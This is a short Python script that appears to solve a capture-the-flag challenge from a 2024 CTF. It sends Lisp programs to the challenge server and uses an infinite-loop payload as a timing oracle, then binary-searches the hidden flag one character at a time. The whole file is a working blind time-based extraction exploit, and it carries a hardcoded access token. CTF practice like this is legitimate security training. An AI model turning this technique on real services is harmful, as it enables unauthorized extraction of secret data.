import requests
import time


TOKEN = "os75y5r5vbpoj72a"

HANG = "((lambda (x) (x x)) (lambda (x) (x x)))"


def run(prog: str):
    start = time.time()
    requests.post(
        f"https://thescenicroute.q.2024.ugractf.ru/{TOKEN}", data={"lisp": prog})
    return time.time() - start


def cond(prog: str):
    return run(f"(if {prog} {HANG} nil)") > 2


flag_formula = "flag"
flag = ""

while True:
    if not cond(flag_formula):
        break

    l = 0
    r = 256
    while r - l > 1:
        m = (l + r) // 2
        if cond(f"(lt (car {flag_formula}) {m})"):
            r = m
        else:
            l = m
    flag += chr(l)
    print(flag)
    flag_formula = f"(cdr {flag_formula})"
